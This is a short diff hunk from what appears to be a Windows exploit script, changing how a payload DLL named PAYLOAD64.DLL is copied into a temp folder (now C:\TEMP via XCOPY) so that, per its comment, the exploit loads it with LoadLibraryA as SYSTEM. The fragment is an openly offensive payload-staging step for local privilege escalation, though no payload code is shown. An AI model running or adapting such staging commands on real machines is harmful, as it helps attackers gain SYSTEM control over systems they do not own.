@@ -5,8 +5,8 @@
 
 print Attempting to copy exploit payload...
 
-# This exploit runs LoadLibraryA(C:\WINDOWS\TEMP\EXPLOIT.DLL) as SYSTEM.
-run CMD /C COPY PAYLOAD64.DLL %SYSTEMROOT%\TEMP\EXPLOIT.DLL
+# This exploit runs LoadLibraryA(C:\TEMP\EXPLOIT.DLL) as SYSTEM.
+run XCOPY PAYLOAD64.DLL C:\TEMP\EXPLOIT.DLL*
 
 # Print a warning if that didnt work.
 repeat rc print
